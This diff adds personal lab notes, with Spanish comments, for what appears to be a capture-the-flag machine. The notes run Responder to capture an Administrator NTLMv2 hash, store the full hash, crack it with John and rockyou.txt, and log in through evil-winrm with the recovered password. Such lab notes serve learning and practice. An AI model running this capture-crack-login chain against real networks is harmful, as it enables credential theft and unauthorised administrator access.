@@ -1,0 +1,21 @@
+sudo nano /etc/hosts  # para agregar de forma manuel un dominio a una ip (ej: 10.129.175.169  unika.htb)
+
+locate responder # para verificar que tenemos responder
+sudo nano /etc/responder/Responder.conf  #para revisar la configuracion y ver que este todo en on
+ip a # para ver todas nuestras interfaces incluyendo VPN
+sudo responder -I tun0  # para indicarle a responder por que interfas escuchar en este caso le estamos indicando "tun0" que es nuestra VPN
+ip a | grep tun0  # para ver nuestra ip en "tun0"
+al captural un hash de ontraseña y un usuario gracias al comando "sudo responder -I tun0" pasamos a crear un archivo con esa informacion
+
+echo "Administrator::RESPONDER:fb4569f26dcfbc87:537CBC81B3D129F546DD3D661A7911C0:0101000000000000806FFA231B5BD90188BE58A4CAACB3B500000000020008005100380049004D0001001E00570049004E002D004F004C0052004200370053005A00540054005800460004003400570049004E002D004F004C0052004200370053005A0054005400580046002E005100380049004D002E004C004F00430041004C00030014005100380049004D002E004C004F00430041004C00050014005100380049004D002E004C004F00430041004C0007000800806FFA231B5BD9010600040002000000080030003000000000000000010000000020000012FD9F5C7810BDE8F8C4EB7059F4FBA8AEFD1317AC1BE5813D2A273179F981AA0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100390039000000000000000000" > hash
+# con el comando "echo" creamos un archivo al que nombramos "hash"
+
+cat hash # para leer el archivo 
+
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz # para descomprimir el rockyou.txt que es un diccionario de hash
+
+# una vez descomprimido el txt pasamos a ocuparlo con jhon para decifrar el hash obtenido gracias a responder 
+john -w=/usr/share/wordlists/rockyou.txt hash  
+
+# ahora que tenemos un usuario y contraseña nos conectamos al objetivo 
+evil-winrm -i (ip objetivo) -u Administrator -p badminton
